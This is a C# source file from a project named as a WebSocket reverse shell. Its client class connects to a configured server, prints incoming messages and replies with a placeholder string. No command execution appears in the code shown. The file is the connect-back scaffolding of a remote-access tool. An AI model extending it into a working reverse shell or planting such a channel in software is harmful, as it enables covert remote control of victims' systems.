using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.WebSockets;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.utils;
using Constants = WebSocketReverseShellDotNet.utils.Constants;
namespace WebSocketReverseShellDotNet.service.impl
{
    internal class WebSocketClient
    {

        public static void ConnectToHost()
        {
            Uri uri = new Uri(Constants.SERVER_WEBSOCKET_URI);

            // Use Task.Run to run the asynchronous part in a separate task
            Task.Run(async () =>
            {
                using (ClientWebSocket webSocket = new ClientWebSocket())
                {
                    try
                    {
                        // Connect to the WebSocket server
                        await webSocket.ConnectAsync(uri, CancellationToken.None);
                        byte[] buffer = new byte[1024];

                        // Continue processing as long as the WebSocket connection is open
                        while (webSocket.State == WebSocketState.Open)
                        {
                            
                            await OnWebSocketMessage(buffer, webSocket);
                        }
                    }
                    catch (Exception ex)
                    {
                        // Handle exceptions that may occur during the connection process
                        Console.WriteLine($"WebSocket connection failed: {ex.Message}");
                    }
                }
            }).Wait(); // Wait for the asynchronous task to complete
        }

        private static async Task OnWebSocketMessage(byte[] buffer, ClientWebSocket webSocket) {
            WebSocketReceiveResult result = await webSocket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);

            if (result.MessageType == WebSocketMessageType.Text)
            {
                // Convert received data to a string
                string receivedData = System.Text.Encoding.UTF8.GetString(buffer, 0, result.Count);
                Console.WriteLine($"Received: {receivedData}");

                await SendData(webSocket, "test test test");

            }

        }

        static async Task SendData(ClientWebSocket webSocket, string message)
        {
            byte[] buffer = System.Text.Encoding.UTF8.GetBytes(message);
            await webSocket.SendAsync(new ArraySegment<byte>(buffer), WebSocketMessageType.Text, true, CancellationToken.None);
        }



    }
}
